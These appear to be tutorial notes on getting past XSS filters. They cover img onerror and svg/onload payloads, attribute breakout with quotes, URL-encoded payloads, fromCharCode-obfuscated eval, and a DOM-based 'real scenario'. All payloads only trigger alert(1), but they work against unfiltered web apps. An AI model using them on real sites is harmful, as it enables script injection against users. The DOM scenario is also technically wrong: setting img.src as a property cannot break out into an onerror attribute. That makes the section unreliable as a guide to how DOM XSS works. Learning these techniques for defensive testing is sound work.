# Filter Bypasses & Payload Tweaks
> Objective: Learn how to bypass basic XSS filters 
using smart payload tricks and quote-breaking techniques.
-----

## What filters usually block
	- <script> tags
	- alert, eval, or dangerous JS functions
	- Quotes (' and ")
	- onerror, onload, javascript:
	- Angle brackets (<, >) and encoded versions

## Bypass Techniques
1.Image Error Trigger
`<img src=x onerror=alert(1)>`
- Fails to load = triggers onerror

2. Break out of attributes
If app outputs this:

`<img src="USER_INPUT.jpg">`

You inject:
`" onerror="alert(1)//`

Result:

`<img src="x" onerror="alert(1)//.jpg">`
JS executes before .jpg is parsed.

3. Alternative Tags

`<svg/onload=alert(1)>`
`<details open ontoggle=alert(1)>`

Browsers allow JS in weird tags.

4. Encoded Payloads

`%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

Great for URL injection.

⸻

🔐 Obfuscated JavaScript

Use ASCII to bypass alert filters:

`<script>
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
</script>`

This runs alert(1) without writing alert(1)

Use https://string.fromcharcode.com to generate these.

⸻

## Real Scenario Practice

App sets:

img.src = location.hash.substring(1) + ".jpg";

You inject in URL:

`#x" onerror="alert(1)//`

Result:

`<img src="x" onerror="alert(1)//.jpg">`

✅ Alert pops before .jpg loads.

⸻

🧠 DOM Refresher (Important)

DOM is not the page or console.
It’s the live JavaScript representation of the page.
JS sees and manipulates the DOM.

You modify the DOM through:
	•	Browser console
	•	JavaScript code
	•	Payloads injected into the page

⸻